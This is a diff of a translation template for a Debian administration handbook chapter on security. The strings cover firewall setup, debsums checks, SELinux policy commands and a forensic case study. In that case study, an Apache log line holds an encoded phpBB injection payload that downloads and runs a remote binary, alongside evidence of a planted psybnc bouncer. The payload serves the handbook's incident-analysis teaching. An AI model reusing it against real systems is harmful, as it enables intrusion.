@@ -4,13 +4,15 @@
 msgid ""
 msgstr ""
 "Project-Id-Version: 0\n"
-"POT-Creation-Date: 2015-06-18T12:29:20\n"
-"PO-Revision-Date: 2015-06-18T12:29:20\n"
+"POT-Creation-Date: 2015-08-28 11:29+0200\n"
+"PO-Revision-Date: 2015-08-28 11:29+0200\n"
 "Last-Translator: Automatically generated\n"
 "Language-Team: None\n"
+"Language: en-US \n"
 "MIME-Version: 1.0\n"
 "Content-Type: application/x-publican; charset=UTF-8\n"
 "Content-Transfer-Encoding: 8bit\n"
+"X-Generator: Publican v4.3.2\n"
 
 #. Tag: keyword
 #, no-c-format
@@ -555,8 +557,7 @@ msgstr ""
 #. Tag: screen
 #, no-c-format
 msgid "\n"
-"<computeroutput># </computeroutput><userinput>aptitude install fwbuilder</userinput>\n"
-""
+"<computeroutput># </computeroutput><userinput>aptitude install fwbuilder</userinput>"
 msgstr ""
 
 #. Tag: title
@@ -581,14 +582,14 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
-msgid "auto eth0\n"
+msgid ""
+"auto eth0\n"
 "iface eth0 inet static\n"
 "    address 192.168.0.1\n"
 "    network 192.168.0.0\n"
 "    netmask 255.255.255.0\n"
 "    broadcast 192.168.0.255\n"
-"    up /usr/local/etc/arrakis.fw\n"
-""
+"    up /usr/local/etc/arrakis.fw"
 msgstr ""
 
 #. Tag: title
@@ -863,7 +864,8 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
-msgid "\n"
+msgid ""
+"\n"
 "<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `debsums -l`</userinput>\n"
 "<computeroutput>[ ... ]\n"
 "# </computeroutput><userinput>debsums -p /var/cache/apt/archives -g</userinput>\n"
@@ -882,7 +884,8 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
-msgid "\n"
+msgid ""
+"\n"
 "<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>\n"
 "<computeroutput>[ ... ]\n"
 "# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>\n"
@@ -1167,8 +1170,7 @@ msgstr ""
 #. Tag: screen
 #, no-c-format
 msgid "<computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>\n"
-"<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>\n"
-""
+"<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>"
 msgstr ""
 
 #. Tag: para
@@ -1184,8 +1186,7 @@ msgstr ""
 #. Tag: screen
 #, no-c-format
 msgid "<computeroutput>$ </computeroutput><userinput>id -Z</userinput>\n"
-"<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>\n"
-""
+"<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>"
 msgstr ""
 
 #. Tag: para
@@ -1195,10 +1196,10 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
-msgid "<computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>\n"
+msgid ""
+"<computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>\n"
 "<computeroutput>unconfined_u:object_r:user_home_t:s0 test\n"
-"     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>\n"
-""
+"     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>"
 msgstr ""
 
 #. Tag: para
@@ -1298,7 +1299,8 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
-msgid "<computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/aide.pp</userinput>\n"
+msgid ""
+"<computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/aide.pp</userinput>\n"
 "<computeroutput># </computeroutput><userinput>semodule -l</userinput>\n"
 "<computeroutput>aide    1.4.0\n"
 "apache  1.10.0\n"
@@ -1308,8 +1310,7 @@ msgid "<computeroutput># </computeroutput><userinput>semodule -i /usr/share/seli
 "<computeroutput># </computeroutput><userinput>semodule -l</userinput>\n"
 "<computeroutput>apache  1.10.0\n"
 "apm     1.7.0\n"
-"[...]</computeroutput>\n"
-""
+"[...]</computeroutput>"
 msgstr ""
 
 #. Tag: para
@@ -1339,7 +1340,8 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
-msgid "<computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>\n"
+msgid ""
+"<computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>\n"
 "<computeroutput># </computeroutput><userinput>semanage login -l</userinput>\n"
 "<computeroutput>\n"
 "Login Name                SELinux User              MLS/MCS Range\n"
@@ -1348,8 +1350,7 @@ msgid "<computeroutput># </computeroutput><userinput>semanage login -a -s user_u
 "rhertzog                  user_u                    None\n"
 "root                      unconfined_u              s0-s0:c0.c1023\n"
 "system_u                  system_u                  s0-s0:c0.c1023\n"
-"# </computeroutput><userinput>semanage login -d rhertzog</userinput> \n"
-""
+"# </computeroutput><userinput>semanage login -d rhertzog</userinput> "
 msgstr ""
 
 #. Tag: para
@@ -1359,7 +1360,8 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
-msgid "<computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>\n"
+msgid ""
+"<computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>\n"
 "<computeroutput># </computeroutput><userinput>semanage user -l</userinput>\n"
 "<computeroutput>\n"
 "                Labeling   MLS/       MLS/\n"
@@ -1372,8 +1374,7 @@ msgid "<computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_
 "test_u          staff      s0         s0               staff_r user_r\n"
 "unconfined_u    unconfined s0         s0-s0:c0.c1023   system_r unconfined_r\n"
 "user_u          user       s0         s0               user_r\n"
-"# </computeroutput><userinput>semanage user -d test_u</userinput>\n"
-""
+"# </computeroutput><userinput>semanage user -d test_u</userinput>"
 msgstr ""
 
 #. Tag: title
@@ -1398,12 +1399,12 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
-msgid "<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>\n"
+msgid ""
+"<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>\n"
 "<computeroutput>httpd_enable_homedirs --&gt; off\n"
 "# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>\n"
 "<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> \n"
-"<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>\n"
-""
+"<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>"
 msgstr ""
 
 #. Tag: title
@@ -1423,11 +1424,11 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
-msgid "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/Makefile.example.gz &gt;Makefile</userinput>\n"
+msgid ""
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/Makefile.example.gz &gt;Makefile</userinput>\n"
 "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.fc.gz &gt;example.fc</userinput>\n"
 "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.if.gz &gt;example.if</userinput>\n"
-"<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>\n"
-""
+"<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>"
 msgstr ""
 
 #. Tag: para
@@ -1452,13 +1453,13 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
-msgid "# myapp executable will have:\n"
+msgid ""
+"# myapp executable will have:\n"
 "# label: system_u:object_r:myapp_exec_t\n"
 "# MLS sensitivity: s0\n"
 "# MCS categories: &lt;none&gt;\n"
 "\n"
-"/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)\n"
-""
+"/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)"
 msgstr ""
 
 #. Tag: title
@@ -1483,7 +1484,8 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
-msgid "## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
+msgid ""
+"## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
 "## &lt;desc&gt;\n"
 "##      &lt;p&gt;\n"
 "##              More descriptive text about myapp.  The &lt;desc&gt;\n"
@@ -1532,8 +1534,7 @@ msgid "## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
 "\n"
 "        logging_search_logs($1)\n"
 "        allow $1 myapp_log_t:file r_file_perms;\n"
-"')\n"
-""
+"')"
 msgstr ""
 
 #. Tag: title
@@ -1578,7 +1579,8 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
-msgid "policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
+msgid ""
+"policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
 "\n"
 "########################################\n"
 "#\n"
@@ -1604,8 +1606,7 @@ msgid "policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
 "allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id=\"example.te.allow\"></co>\n"
 "\n"
 "allow myapp_t myapp_tmp_t:file manage_file_perms;\n"
-"files_tmp_filetrans(myapp_t,myapp_tmp_t,file)\n"
-""
+"files_tmp_filetrans(myapp_t,myapp_tmp_t,file)"
 msgstr ""
 
 #. Tag: para
@@ -1655,8 +1656,7 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
-msgid "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file\n"
-""
+msgid "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file"
 msgstr ""
 
 #. Tag: para
@@ -2061,7 +2061,8 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
-msgid "\n"
+msgid ""
+"\n"
 "<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>\n"
 "<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>\n"
 "      "
@@ -2234,7 +2235,8 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
-msgid "\n"
+msgid ""
+"\n"
 "www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n"
 "      "
 msgstr ""
@@ -2256,7 +2258,8 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
-msgid "** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)\n"
+msgid ""
+"** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)\n"
 "** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT\n"
 "** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024\n"
 "** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating\n"
@@ -2268,8 +2271,7 @@ msgid "** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbus
 "(...)\n"
 "** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)\n"
 "(...)\n"
-"** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)\n"
-""
+"** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)"
 msgstr ""
 
 #. Tag: para
